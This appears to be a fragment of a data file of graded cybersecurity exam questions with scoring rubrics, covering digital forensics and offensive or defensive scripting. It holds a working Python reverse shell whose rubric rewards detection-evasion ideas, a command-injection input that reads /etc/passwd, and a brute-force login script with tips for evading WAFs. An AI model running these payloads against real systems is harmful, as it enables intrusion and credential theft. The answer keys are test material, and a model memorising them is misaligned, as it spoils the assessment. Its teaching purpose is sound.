    `You are acquiring a forensic image of a suspect's hard drive. Walk through this process:\n\n\`\`\`bash\n# Step 1: Write blocker connected\n\n# Step 2: Create image\ndc3dd if=/dev/sdb of=/evidence/case001.dd hash=sha256 log=/evidence/case001.log\n\n# Step 3: Verify\nsha256sum /evidence/case001.dd\n\n# Step 4: Mount for analysis\nmount -o ro,loop /evidence/case001.dd /mnt/evidence\n\`\`\`\n\nExplain why each step is necessary for forensic integrity. What would happen if you skipped the write blocker? Why use dd/dc3dd instead of just copying files? What is the legal significance of the hash verification? What risks exist in step 4?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "write-blocker", description: "Explains write blocker prevents any modification to the source drive, preserving evidence integrity", points: 2, keywords: ["write blocker", "prevent modification", "read-only", "evidence integrity", "original"], check: "Student explains the purpose of write blocking" },
      { id: "bit-for-bit", description: "Explains dd creates a bit-for-bit copy including slack space, deleted files, and unallocated areas", points: 2, keywords: ["bit-for-bit", "sector", "slack space", "deleted", "unallocated", "raw"], check: "Student explains why raw imaging captures more than file copying" },
      { id: "hash-chain", description: "Explains hash verification creates a chain of custody — proves the copy matches the original", points: 2, keywords: ["chain of custody", "integrity", "hash", "verify", "tamper", "court", "evidence"], check: "Student explains the legal chain-of-custody role of hashing" },
      { id: "mount-risks", description: "Notes mount risks: must use read-only, noexec, and loop options to prevent evidence modification", points: 2, keywords: ["read-only", "ro", "noexec", "loop", "modify", "access time", "atime"], check: "Student identifies the risks of mounting evidence and the necessary precautions" },
    ],
    gaps: [
      { if_missing: "write-blocker", gap: "Does not understand evidence preservation — study forensic acquisition best practices" },
      { if_missing: "hash-chain", gap: "Missing chain-of-custody knowledge — review legal requirements for digital evidence" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "network-capture",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `You capture network traffic during an incident and find this in a PCAP file:\n\n\`\`\`\nFrame 1: TCP SYN to 10.0.0.50:4444\nFrame 2: TCP SYN-ACK from 10.0.0.50:4444\nFrame 3: TCP ACK\nFrame 4: Data: "Microsoft Windows [Version 10.0.19041]"\nFrame 5: Data: "(C) 2020 Microsoft Corporation."\nFrame 6: Data: "C:\\\\Users\\\\victim>"\nFrame 7: Data: "whoami\\r\\n"\nFrame 8: Data: "corp\\\\victim\\r\\n"\nFrame 9: Data: "C:\\\\Users\\\\victim>"\n\`\`\`\n\nWhat type of connection is this? Why is the data unencrypted? What tool likely created this connection on the victim side? How would you extract the full session from the PCAP, and what additional analysis would you perform?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "reverse-shell", description: "Identifies this as a reverse shell connection — victim connected outbound to attacker on port 4444", points: 2, keywords: ["reverse shell", "outbound", "4444", "attacker", "cmd.exe", "callback"], check: "Student correctly identifies the reverse shell pattern" },
      { id: "unencrypted", description: "Explains the data is plaintext because it is a basic TCP reverse shell without encryption (like netcat)", points: 2, keywords: ["plaintext", "no encryption", "netcat", "TCP", "unencrypted", "raw"], check: "Student explains why the session is unencrypted" },
      { id: "session-extraction", description: "Describes using Wireshark Follow TCP Stream or tshark to extract the full session", points: 2, keywords: ["Follow TCP Stream", "Wireshark", "tshark", "session", "extract", "reassemble"], check: "Student describes how to extract the complete session from the PCAP" },
      { id: "additional-analysis", description: "Suggests checking for data exfiltration, identifying the initial compromise vector, timeline correlation", points: 2, keywords: ["exfiltration", "initial access", "timeline", "correlate", "other connections", "IOC"], check: "Student proposes further investigation steps" },
    ],
    gaps: [
      { if_missing: "reverse-shell", gap: "Cannot identify reverse shells in traffic — study common C2 patterns in network captures" },
      { if_missing: "session-extraction", gap: "Weak packet analysis skills — practice PCAP analysis with Wireshark" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "file-carving",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A junior analyst wrote this Python script to carve JPEG files from a disk image, but it produces corrupted output:\n\n\`\`\`python\ndef carve_jpegs(image_path, output_dir):\n    JPEG_START = b'\\xff\\xd8\\xff'\n    JPEG_END = b'\\xff\\xd9'\n    \n    with open(image_path, 'r') as f:\n        data = f.read()\n    \n    count = 0\n    pos = 0\n    while pos < len(data):\n        start = data.find(JPEG_START, pos)\n        if start == -1:\n            break\n        end = data.find(JPEG_END, start)\n        if end == -1:\n            break\n        \n        jpeg_data = data[start:end]\n        with open(f'{output_dir}/carved_{count}.jpg', 'w') as out:\n            out.write(jpeg_data)\n        \n        count += 1\n        pos = end\n\`\`\`\n\nIdentify all the bugs. Fix the code and explain why each bug corrupts the output. What edge cases does this approach miss even after fixing?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "binary-mode", description: "Identifies files must be opened in binary mode ('rb'/'wb') — text mode corrupts binary data", points: 2, keywords: ["binary", "rb", "wb", "text mode", "encoding", "corrupt", "bytes"], check: "Student identifies the text mode file I/O as the primary corruption cause" },
      { id: "end-marker", description: "Notes JPEG_END (FFD9) is 2 bytes but the slice excludes it — must be end + 2", points: 2, keywords: ["end + 2", "FFD9", "excluded", "off by", "include marker", "slice"], check: "Student fixes the end-of-file marker inclusion" },
      { id: "embedded-jpegs", description: "Notes a JPEG can contain embedded JPEGs (EXIF thumbnails), causing false end markers", points: 2, keywords: ["embedded", "thumbnail", "EXIF", "false positive", "nested", "marker"], check: "Student identifies the embedded JPEG false-positive problem" },
      { id: "memory", description: "Notes reading entire disk image into memory will fail for large images — needs chunked reading", points: 2, keywords: ["memory", "large", "chunk", "streaming", "buffer", "mmap", "out of memory"], check: "Student identifies the memory scalability issue" },
    ],
    gaps: [
      { if_missing: "binary-mode", gap: "Does not understand binary vs. text file modes — review Python file I/O for binary data" },
      { if_missing: "embedded-jpegs", gap: "Unaware of file format complexities — study JPEG structure and embedded data" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "timeline-analysis",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `An incident responder creates a filesystem timeline but gets misleading results:\n\n\`\`\`bash\n# Create timeline from MFT\nfls -r -m / /dev/sda1 > body.txt\nmactime -b body.txt -d > timeline.csv\n\n# Search for activity around the incident\ngrep "2024-03-15" timeline.csv | sort\n\`\`\`\n\nThe timeline shows suspicious files were created AFTER the attacker's access was revoked. The responder concludes the attacker returned. Before accepting this conclusion, what timestamp manipulation techniques should the responder consider? What other timestamp sources would corroborate or refute the timeline? Fix the investigation methodology.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "timestomping", description: "Identifies timestomping — attackers can modify MACB timestamps using tools like timestomp", points: 2, keywords: ["timestomping", "timestomp", "modify", "MACB", "fake", "manipulate"], check: "Student identifies timestamp manipulation as a possibility" },
      { id: "mft-si-fn", description: "Notes MFT contains both $STANDARD_INFORMATION and $FILE_NAME timestamps — $FN is harder to forge", points: 2, keywords: ["$STANDARD_INFORMATION", "$FILE_NAME", "$SI", "$FN", "MFT", "harder to forge"], check: "Student knows about comparing $SI and $FN timestamps for timestomping detection" },
      { id: "corroboration", description: "Suggests corroborating with event logs, USN journal, prefetch, and network logs", points: 2, keywords: ["event log", "USN journal", "prefetch", "network", "corroborate", "independent"], check: "Student suggests multiple independent timestamp sources" },
      { id: "methodology-fix", description: "Recommends comparing multiple timestamp sources before concluding, not relying on filesystem alone", points: 2, keywords: ["multiple sources", "cross-reference", "not rely", "corroborate", "methodology"], check: "Student fixes the investigation to use multiple evidence sources" },
    ],
    gaps: [
      { if_missing: "timestomping", gap: "Unaware of timestamp manipulation — study anti-forensic techniques and their detection" },
      { if_missing: "mft-si-fn", gap: "Missing MFT analysis depth — study NTFS MFT structure and timestamp attributes" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "volatile-data",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A first responder arrives at a compromised system that is still running. They execute:\n\n\`\`\`bash\n# Shut down the system cleanly\nshutdown -h now\n\n# Later, in the lab:\ndd if=/dev/sda of=/evidence/disk.img bs=4M\nautopsy /evidence/disk.img\n\`\`\`\n\nWhat critical forensic evidence did the responder destroy? Write the correct volatile data collection procedure they should have followed BEFORE shutting down. List the specific commands in order of volatility.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "volatile-lost", description: "Identifies lost volatile data: RAM contents, running processes, network connections, logged-in users", points: 2, keywords: ["RAM", "memory", "processes", "connections", "volatile", "lost", "destroyed"], check: "Student identifies what volatile evidence was destroyed" },
      { id: "order-of-volatility", description: "Lists RFC 3227 order of volatility: registers, cache, RAM, disk, remote logs", points: 2, keywords: ["order of volatility", "RFC 3227", "registers", "cache", "RAM", "most volatile"], check: "Student follows the order of volatility for collection" },
      { id: "collection-commands", description: "Provides specific commands: memory dump (lime/avml), ps, netstat, lsof, who, date, then disk", points: 2, keywords: ["lime", "avml", "ps aux", "netstat", "lsof", "who", "date", "memory dump"], check: "Student provides specific collection commands in correct order" },
      { id: "trusted-tools", description: "Notes the need to use trusted tools from removable media, not binaries on the compromised system", points: 2, keywords: ["trusted", "removable media", "USB", "static binary", "not compromised", "known good"], check: "Student emphasizes using trusted tools from external media" },
    ],
    gaps: [
      { if_missing: "volatile-lost", gap: "Does not understand volatile evidence — study the forensic significance of live system data" },
      { if_missing: "order-of-volatility", gap: "Missing order of volatility knowledge — review RFC 3227 and evidence collection priorities" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "malware-forensics",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You receive a suspected malware sample from an incident. Design a complete analysis workflow that covers:\n\n1. Safe handling and initial triage (static analysis)\n2. Dynamic analysis in a sandbox environment\n3. Code-level analysis if static/dynamic analysis is inconclusive\n\nFor each phase, specify: the exact tools you would use, what artifacts you would collect, safety precautions, and how you would determine if the sample is malicious. Include how you would handle a sample that detects sandbox environments.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "static-triage", description: "Describes hashing, strings, PE analysis, import table review, and reputation checking", points: 2, keywords: ["hash", "strings", "PE", "imports", "VirusTotal", "file", "YARA", "packer"], check: "Student describes a comprehensive static triage process" },
      { id: "sandbox-setup", description: "Describes isolated VM with snapshot, network simulation, and monitoring tools", points: 2, keywords: ["VM", "snapshot", "isolated", "network simulation", "inetsim", "fakenet", "monitor"], check: "Student sets up proper sandbox isolation" },
      { id: "dynamic-tools", description: "Names specific dynamic analysis tools: Process Monitor, Regshot, API Monitor, Wireshark, Procmon", points: 2, keywords: ["Process Monitor", "Procmon", "Regshot", "API Monitor", "Wireshark", "behavior"], check: "Student names specific behavioral analysis tools" },
      { id: "anti-sandbox", description: "Addresses sandbox evasion: timing checks, hardware fingerprinting, environment detection, and countermeasures", points: 3, keywords: ["anti-sandbox", "timing", "hardware", "detection", "sleep", "CPUID", "RDTSC", "countermeasure"], check: "Student handles sandbox-aware malware with specific countermeasures" },
    ],
    gaps: [
      { if_missing: "sandbox-setup", gap: "Missing sandbox methodology — study malware analysis lab setup and isolation" },
      { if_missing: "anti-sandbox", gap: "Does not handle sandbox-aware samples — study anti-analysis techniques and their bypass" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "incident-reconstruction",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `A company discovers that sensitive customer data was exfiltrated over a 3-month period. You have access to:\n- Windows Security and Sysmon logs (3 months)\n- Firewall logs (3 months)\n- Memory dump from one compromised server (taken at discovery)\n- Disk images from 3 suspected compromised workstations\n- Email gateway logs\n\nDesign a complete forensic investigation plan to:\n1. Determine the initial access vector\n2. Map the lateral movement path\n3. Identify all compromised systems\n4. Determine exactly what data was exfiltrated\n5. Build a court-admissible evidence chain\n\nSpecify tools, analysis order, and how evidence from each source corroborates the others.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "evidence-prioritization", description: "Prioritizes volatile evidence (memory dump) first, then correlates with persistent sources", points: 2, keywords: ["prioritize", "memory", "volatile", "first", "correlate", "persistent"], check: "Student correctly prioritizes evidence sources by volatility" },
      { id: "initial-access", description: "Describes using email logs + endpoint logs to trace initial access (phishing, exploit, credential)", points: 2, keywords: ["initial access", "email", "phishing", "exploit", "first compromise", "patient zero"], check: "Student describes a method for identifying the initial access vector" },
      { id: "lateral-mapping", description: "Uses Sysmon + Windows Security logs to trace lateral movement via logon events, process creation, network connections", points: 2, keywords: ["lateral movement", "Sysmon", "logon events", "4624", "process creation", "network"], check: "Student maps lateral movement using log correlation" },
      { id: "exfil-analysis", description: "Uses firewall logs + network captures to identify exfiltration channels, volumes, and destinations", points: 2, keywords: ["exfiltration", "firewall", "data volume", "destination", "bytes", "upload", "DNS"], check: "Student identifies exfiltration through network analysis" },
      { id: "evidence-chain", description: "Describes chain-of-custody documentation, hashing, and report preparation for legal proceedings", points: 2, keywords: ["chain of custody", "hash", "documentation", "legal", "court", "admissible", "report"], check: "Student addresses legal evidence requirements" },
    ],
    gaps: [
      { if_missing: "lateral-mapping", gap: "Cannot perform lateral movement analysis — study Windows log correlation for attack path reconstruction" },
      { if_missing: "evidence-chain", gap: "Missing legal evidence procedures — review digital forensics chain-of-custody requirements" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "evidence-types",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Compare these forensic evidence sources for investigating a Windows ransomware incident:\n\n1. Windows Event Logs (Security, System, PowerShell)\n2. NTFS artifacts (MFT, USN Journal, $LogFile)\n3. Memory dump (Volatility analysis)\n4. Network captures (PCAP files)\n\nFor each source: What unique evidence does it provide that no other source can? What are its limitations? In what order would you analyze them and why? Give a specific example of evidence that would only be found in one source.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "unique-evidence", description: "Identifies unique evidence per source: EventLog for auth events, MFT for file timeline, memory for running processes/keys, PCAP for C2 traffic", points: 3, keywords: ["unique", "authentication", "MFT", "timeline", "running process", "encryption key", "C2", "traffic"], check: "Student identifies evidence unique to each source" },
      { id: "limitations", description: "Identifies limitations: logs can be cleared, MFT entries overwritten, memory is volatile, PCAPs may be incomplete", points: 2, keywords: ["cleared", "overwritten", "volatile", "incomplete", "limitation", "gap", "missing"], check: "Student identifies specific limitations of each evidence source" },
      { id: "analysis-order", description: "Justifies analysis order based on volatility and information dependency", points: 2, keywords: ["order", "memory first", "volatile", "dependency", "before", "after"], check: "Student justifies the analysis order with reasoning" },
      { id: "ransomware-specific", description: "Provides ransomware-specific examples: encryption key in memory, ransom note creation in MFT, C2 in PCAP", points: 2, keywords: ["encryption key", "ransom note", "C2 beacon", "ransomware", "specific"], check: "Student gives ransomware-specific evidence examples" },
    ],
    gaps: [
      { if_missing: "unique-evidence", gap: "Cannot differentiate evidence sources — study what is unique to each forensic data source" },
      { if_missing: "ransomware-specific", gap: "Limited ransomware investigation experience — study ransomware-specific forensic indicators" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "anti-forensics",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText:
    `Compare these anti-forensic techniques from both the attacker's and investigator's perspective:\n\n1. Log clearing (wevtutil cl, /var/log deletion)\n2. Timestomping (modifying MACB timestamps)\n3. Secure file deletion (sdelete, shred)\n4. In-memory-only execution (fileless malware)\n5. Encrypted C2 channels (HTTPS, DNS-over-HTTPS)\n\nFor each technique: How effective is it at destroying evidence? What residual artifacts does it leave despite the attempt? What investigative technique defeats or works around it? Rank them by difficulty to detect.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "residual-artifacts", description: "Identifies residual artifacts for each: event log gaps, $FN timestamps, MFT entries, memory traces, TLS metadata", points: 3, keywords: ["residual", "gap", "$FN", "MFT entry", "memory trace", "metadata", "despite"], check: "Student identifies what evidence remains after each anti-forensic technique" },
      { id: "detection-methods", description: "Provides specific detection methods: Sysmon for log clearing, $SI/$FN comparison for timestomping, etc.", points: 2, keywords: ["Sysmon", "1102", "$SI/$FN", "journal", "ETW", "JA3", "detection"], check: "Student provides specific detection methods for each technique" },
      { id: "effectiveness-ranking", description: "Ranks techniques by detection difficulty with justification", points: 2, keywords: ["rank", "hardest", "easiest", "detection difficulty", "most effective", "least"], check: "Student provides a justified difficulty ranking" },
      { id: "fileless-depth", description: "Explains fileless malware in depth: lives in memory/registry/WMI, detected via ETW/AMSI/memory forensics", points: 3, keywords: ["fileless", "memory", "registry", "WMI", "ETW", "AMSI", "PowerShell logging"], check: "Student demonstrates deep understanding of fileless malware and its detection" },
    ],
    gaps: [
      { if_missing: "residual-artifacts", gap: "Assumes anti-forensics is complete — study what artifacts survive each technique" },
      { if_missing: "fileless-depth", gap: "Weak understanding of fileless malware — study in-memory execution and its forensic footprint" },
    ],
  },
},

{
  competencyId: "forensics",
  subTopic: "windows-artifacts",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You are investigating a compromised Windows 10 workstation where the attacker used a USB device to exfiltrate files and then cleaned up their tracks. The Windows Security logs have been cleared.\n\nDesign an investigation plan using Windows artifacts beyond the Security event log to reconstruct:\n1. When the USB device was connected and what device it was\n2. What files were accessed and copied\n3. What programs the attacker ran\n4. What cleanup actions were performed\n\nFor each artifact source, specify its exact filesystem path or registry location, what tool you would use to parse it, and what information it uniquely provides.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "usb-artifacts", description: "Identifies USBSTOR registry key, setupapi.dev.log, and event logs (20001, 20003) for USB device tracking", points: 2, keywords: ["USBSTOR", "setupapi", "registry", "serial number", "vendor", "product"], check: "Student identifies USB connection artifacts in registry and logs" },
      { id: "file-access", description: "Uses Shellbags, Recent files, Jump Lists, LNK files, and MFT to trace file access", points: 2, keywords: ["Shellbags", "Recent", "Jump List", "LNK", "MFT", "file access"], check: "Student uses multiple artifacts to reconstruct file access" },
      { id: "program-execution", description: "Checks Prefetch, Amcache, ShimCache, BAM/DAM, and UserAssist for program execution evidence", points: 3, keywords: ["Prefetch", "Amcache", "ShimCache", "BAM", "UserAssist", "execution"], check: "Student identifies multiple execution artifact sources" },
      { id: "cleanup-detection", description: "Detects cleanup through USN journal gaps, event log clearing event (1102), and missing Prefetch files", points: 2, keywords: ["USN journal", "1102", "gap", "clearing", "missing", "anti-forensics"], check: "Student detects evidence of cleanup activities" },
    ],
    gaps: [
      { if_missing: "program-execution", gap: "Missing knowledge of Windows execution artifacts — study Prefetch, Amcache, and ShimCache analysis" },
      { if_missing: "usb-artifacts", gap: "Cannot track USB device usage — study Windows USB forensic artifacts and their locations" },
    ],
  },
},

// --- scripting (Scripting & automation) ---

{
  competencyId: "scripting",
  subTopic: "socket-programming",
  questionType: "predict_output",
  difficulty: 1,
  questionText:
    `What does this Python script do, and what will it print when connecting to a web server on port 80?\n\n\`\`\`python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('example.com', 80))\ns.sendall(b'HEAD / HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n')\nresponse = s.recv(4096)\nprint(response.decode())\ns.close()\n\`\`\`\n\nExplain each line. What is the difference between \`SOCK_STREAM\` and \`SOCK_DGRAM\`? What does the \`HEAD\` method return versus \`GET\`? Why is \`Connection: close\` important here?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "socket-type", description: "Explains SOCK_STREAM is TCP (reliable, ordered) and SOCK_DGRAM is UDP (unreliable, unordered)", points: 2, keywords: ["TCP", "UDP", "SOCK_STREAM", "SOCK_DGRAM", "reliable", "connectionless"], check: "Student correctly differentiates TCP and UDP socket types" },
      { id: "head-method", description: "Explains HEAD returns only HTTP headers without body, useful for reconnaissance", points: 2, keywords: ["HEAD", "headers only", "no body", "server info", "Content-Length"], check: "Student explains the HEAD method and its utility" },
      { id: "connection-close", description: "Explains Connection: close tells the server to close after response, preventing recv from hanging", points: 2, keywords: ["Connection: close", "hang", "EOF", "keep-alive", "close after"], check: "Student explains why Connection: close prevents the recv from blocking" },
      { id: "output", description: "Predicts output will be HTTP response headers (status line, server, content-type, etc.)", points: 1, keywords: ["HTTP/1.1 200", "headers", "Server:", "Content-Type", "response"], check: "Student predicts the HTTP response header output" },
    ],
    gaps: [
      { if_missing: "socket-type", gap: "Does not understand socket types — review TCP vs UDP at the socket API level" },
      { if_missing: "connection-close", gap: "Missing HTTP connection management knowledge — study HTTP keep-alive and connection lifecycle" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "subprocess-execution",
  questionType: "predict_output",
  difficulty: 2,
  questionText:
    `Predict the behavior of each code snippet and identify which ones have security issues:\n\n\`\`\`python\n# Snippet A\nimport subprocess\nuser_input = "8.8.8.8; cat /etc/passwd"\nresult = subprocess.run(f"ping -c 1 {user_input}", shell=True, capture_output=True)\n\n# Snippet B\nimport subprocess\nuser_input = "8.8.8.8; cat /etc/passwd"\nresult = subprocess.run(["ping", "-c", "1", user_input], capture_output=True)\n\n# Snippet C\nimport os\nuser_input = "8.8.8.8; cat /etc/passwd"\nos.system(f"ping -c 1 {user_input}")\n\`\`\`\n\nFor each: What happens? Which ones execute \`cat /etc/passwd\`? Why? What is the fundamental difference between shell=True and passing a list?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "shell-injection", description: "Identifies A and C as vulnerable to command injection — shell=True and os.system parse the semicolon", points: 2, keywords: ["command injection", "shell=True", "os.system", "semicolon", "shell interprets"], check: "Student correctly identifies which snippets are vulnerable" },
      { id: "list-safe", description: "Explains B is safe because the list form passes arguments directly without shell interpretation", points: 2, keywords: ["list", "no shell", "direct", "argv", "no interpretation", "safe"], check: "Student explains why the list form prevents injection" },
      { id: "shell-vs-exec", description: "Explains shell=True invokes /bin/sh -c which interprets metacharacters, vs. direct exec", points: 2, keywords: ["/bin/sh", "metacharacters", "direct exec", "execvp", "shell parsing"], check: "Student explains the fundamental difference in execution mechanism" },
      { id: "output-prediction", description: "Correctly predicts A and C show passwd contents, B fails with ping error for invalid hostname", points: 1, keywords: ["passwd", "error", "invalid", "hostname", "different behavior"], check: "Student predicts the concrete output of each snippet" },
    ],
    gaps: [
      { if_missing: "shell-injection", gap: "Does not understand command injection in Python subprocess — study shell=True dangers" },
      { if_missing: "shell-vs-exec", gap: "Missing understanding of shell vs. direct execution — review how the OS executes commands" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "bash-scripting",
  questionType: "spot_vuln",
  difficulty: 1,
  questionText:
    `This bash script is used for automated reconnaissance. Find all the bugs and vulnerabilities:\n\n\`\`\`bash\n#!/bin/bash\nTARGET=$1\nOUTPUT=/tmp/recon_$TARGET\n\nmkdir $OUTPUT\ncd $OUTPUT\n\nnmap -sV $TARGET > nmap.txt\ngobuster dir -u http://$TARGET -w /usr/share/wordlists/common.txt > dirs.txt\n\nfor port in $(cat nmap.txt | grep open | awk '{print $1}' | cut -d'/' -f1); do\n  curl http://$TARGET:$port/ > port_$port.html 2>/dev/null\ndone\n\ntar czf /tmp/recon_$TARGET.tar.gz $OUTPUT\nrm -rf $OUTPUT\n\necho "Results saved to /tmp/recon_$TARGET.tar.gz"\n\`\`\`\n\nIdentify all unquoted variable issues, logic bugs, and security vulnerabilities. What happens if TARGET contains spaces or special characters?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "unquoted-vars", description: "Identifies all unquoted variables that break with spaces/special chars in TARGET", points: 2, keywords: ["unquoted", "quotes", "\"$TARGET\"", "word splitting", "globbing", "spaces"], check: "Student identifies the unquoted variable expansion issues" },
      { id: "cd-failure", description: "Notes cd can fail silently, causing all subsequent commands to run in wrong directory", points: 2, keywords: ["cd", "fail", "wrong directory", "|| exit", "set -e", "check"], check: "Student identifies the unchecked cd failure risk" },
      { id: "tmp-race", description: "Identifies /tmp predictable naming as a symlink race condition vulnerability", points: 2, keywords: ["/tmp", "predictable", "symlink", "race", "mktemp", "TOCTOU"], check: "Student flags the /tmp predictable path as a security issue" },
      { id: "rm-rf-danger", description: "Notes rm -rf $OUTPUT without quotes could delete unintended directories", points: 1, keywords: ["rm -rf", "unquoted", "dangerous", "delete", "wrong path"], check: "Student flags the dangerous unquoted rm -rf" },
    ],
    gaps: [
      { if_missing: "unquoted-vars", gap: "Does not quote shell variables — study bash word splitting and quoting rules" },
      { if_missing: "tmp-race", gap: "Unaware of /tmp race conditions — study secure temporary file handling" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "web-scraping",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `A pentester wrote this credential harvesting script but it leaks their identity and misses results:\n\n\`\`\`python\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef brute_force_login(url, usernames, passwords):\n    for user in usernames:\n        for pwd in passwords:\n            r = requests.post(url, data={'username': user, 'password': pwd})\n            if 'Welcome' in r.text:\n                print(f'[+] Found: {user}:{pwd}')\n                return user, pwd\n            # No delay between attempts\n    \n    return None\n\ndef scrape_admin_panel(url):\n    session = requests.Session()\n    r = session.get(url, verify=False)\n    # Parse all links\n    soup = BeautifulSoup(r.text, 'html.parser')\n    for link in soup.find_all('a'):\n        print(link.get('href'))\n\`\`\`\n\nIdentify the OPSEC failures, reliability issues, and missing functionality. How would a WAF detect this? Fix the most critical issues.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "no-delay", description: "No delay between requests enables rate limiting and account lockout", points: 2, keywords: ["delay", "rate limit", "lockout", "sleep", "throttle", "too fast"], check: "Student identifies missing request delays" },
      { id: "default-ua", description: "Default User-Agent (python-requests) is instantly flagged by WAFs", points: 2, keywords: ["User-Agent", "python-requests", "WAF", "fingerprint", "rotate", "realistic"], check: "Student flags the default User-Agent as detectable" },
      { id: "verify-false", description: "verify=False disables TLS verification — accepts any certificate, vulnerable to MITM", points: 2, keywords: ["verify=False", "TLS", "certificate", "MITM", "insecure", "disable"], check: "Student identifies disabled TLS verification as a security issue" },
      { id: "csrf-missing", description: "No CSRF token handling — many login forms require it, causing all attempts to fail", points: 2, keywords: ["CSRF", "token", "hidden field", "form", "missing", "anti-CSRF"], check: "Student identifies missing CSRF token handling" },
    ],
    gaps: [
      { if_missing: "csrf-missing", gap: "Unaware of CSRF tokens in login forms — study how web forms use anti-CSRF tokens" },
      { if_missing: "no-delay", gap: "Does not consider rate limiting — study how defensive measures detect brute force" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "reverse-shell",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `Trace the execution of this Python reverse shell payload:\n\n\`\`\`python\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("10.10.14.5", 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call(["/bin/bash", "-i"])\n\`\`\`\n\nExplain each line. What does \`os.dup2\` do with file descriptors 0, 1, 2? Why does the \`-i\` flag on bash matter? How would you modify this to evade basic detection? What is the difference between a reverse shell and a bind shell?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "dup2-explained", description: "Explains dup2 redirects stdin(0), stdout(1), stderr(2) to the socket, so bash I/O flows over the network", points: 2, keywords: ["dup2", "stdin", "stdout", "stderr", "file descriptor", "redirect", "0", "1", "2"], check: "Student correctly explains file descriptor redirection via dup2" },
      { id: "interactive-bash", description: "Explains -i makes bash interactive, providing a prompt and enabling job control", points: 2, keywords: ["-i", "interactive", "prompt", "job control", "PTY"], check: "Student explains why the interactive flag matters" },
      { id: "reverse-vs-bind", description: "Contrasts reverse shell (victim connects out) vs bind shell (victim listens for connection)", points: 2, keywords: ["reverse", "outbound", "bind", "listen", "inbound", "firewall"], check: "Student correctly differentiates reverse and bind shells" },
      { id: "evasion", description: "Suggests evasion: encryption, encoding, using common ports (443), or legitimate protocols", points: 2, keywords: ["encrypt", "encode", "443", "HTTPS", "obfuscate", "evasion", "detection"], check: "Student proposes specific evasion techniques" },
    ],
    gaps: [
      { if_missing: "dup2-explained", gap: "Does not understand file descriptor redirection — study Unix file descriptors and dup2 syscall" },
      { if_missing: "reverse-vs-bind", gap: "Cannot differentiate shell types — review reverse shell vs bind shell architectures" },
    ],
  },
},

{
  competencyId: "scripting",
  subTopic: "log-parsing",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `Trace what this bash pipeline does and predict its output given the sample log data:\n\n\`\`\`bash\ncat auth.log | grep "Failed password" | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10\n\`\`\`\n\nSample auth.log:\n\`\`\`\nMar 15 14:23:01 server sshd[1234]: Failed password for admin from 10.0.0.5 port 45123 ssh2\nMar 15 14:23:02 server sshd[1235]: Failed password for admin from 10.0.0.5 port 45124 ssh2\nMar 15 14:23:03 server sshd[1236]: Failed password for root from 192.168.1.100 port 33456 ssh2\nMar 15 14:23:04 server sshd[1237]: Failed password for invalid user test from 10.0.0.5 port 45125 ssh2\nMar 15 14:23:05 server sshd[1238]: Failed password for admin from 10.0.0.5 port 45126 ssh2\n\`\`\`\n\nExplain each pipeline stage. What does \`$(NF-3)\` mean in awk? What does this pipeline reveal about the log data? What is the limitation of this approach?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "pipeline-stages", description: "Correctly explains each stage: grep filters, awk extracts IP, sort groups, uniq counts, sort ranks", points: 2, keywords: ["grep", "filter", "awk", "extract", "sort", "uniq -c", "count", "rank"], check: "Student traces each pipeline stage correctly" },
      { id: "nf-minus-3", description: "Explains NF is the number of fields, NF-3 is the 4th from last field (the IP address)", points: 2, keywords: ["NF", "number of fields", "NF-3", "4th from last", "IP address"], check: "Student correctly explains awk's NF variable" },
      { id: "output-prediction", description: "Predicts the output shows IP addresses ranked by failed attempt count", points: 2, keywords: ["10.0.0.5", "3", "192.168.1.100", "1", "ranked", "count"], check: "Student correctly predicts the output" },
      { id: "limitations", description: "Identifies limitations: NF-3 breaks for 'invalid user' lines (different field count), no timestamp analysis", points: 2, keywords: ["invalid user", "field count", "different format", "timestamp", "limitation", "breaks"], check: "Student identifies the field count inconsistency across log formats" },
    ],
